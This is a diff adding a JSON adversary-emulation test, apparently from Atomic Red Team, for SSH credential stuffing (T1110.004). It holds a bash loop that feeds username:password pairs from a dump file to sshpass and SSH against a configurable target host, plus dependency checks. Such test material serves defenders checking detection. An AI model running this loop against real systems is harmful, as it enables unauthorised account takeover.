@@ -1,0 +1,86 @@
+{
+  "id": "4f08197a-2a8a-472d-9589-cd2895ef22ad",
+  "name": "SSH Credential Stuffing From Linux",
+  "description": "Using username,password combination from a password dump to login over SSH.\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "078e7c9b-fd05-4ef1-b153-1907d13c0cb3",
+      "type": "execute-command",
+      "data": {
+        "command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n",
+        "command_type": "bash"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "324c2d35-8db4-4bdd-9b22-eaeca65d410d",
+      "name": "Check dependency 1/1",
+      "description": "Requires SSHPASS\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "707b79aa-9442-44ff-ac9b-1d53011335c5",
+      "name": "Resolve dependency 1/1",
+      "description": "Requires SSHPASS\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update \u0026\u0026 sudo apt install sshpass -y; else echo \"This test requires sshpass\" ; fi ;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "28e2b63f-a4de-453d-a268-b239af177760",
+      "name": "Re-check dependency 1/1",
+      "description": "Requires SSHPASS\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "324c2d35-8db4-4bdd-9b22-eaeca65d410d",
+      "p": "on-success",
+      "o": "078e7c9b-fd05-4ef1-b153-1907d13c0cb3"
+    },
+    {
+      "s": "324c2d35-8db4-4bdd-9b22-eaeca65d410d",
+      "p": "on-failure",
+      "o": "707b79aa-9442-44ff-ac9b-1d53011335c5"
+    },
+    {
+      "s": "707b79aa-9442-44ff-ac9b-1d53011335c5",
+      "p": "on-success",
+      "o": "28e2b63f-a4de-453d-a268-b239af177760"
+    },
+    {
+      "s": "28e2b63f-a4de-453d-a268-b239af177760",
+      "p": "on-failure",
+      "o": "078e7c9b-fd05-4ef1-b153-1907d13c0cb3"
+    }
+  ],
+  "tags": [
+    "T1110.004",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "target_host",
+      "type": "string",
+      "description": "IP Address / Hostname you want to target.",
+      "value": "localhost"
+    }
+  ]
+}
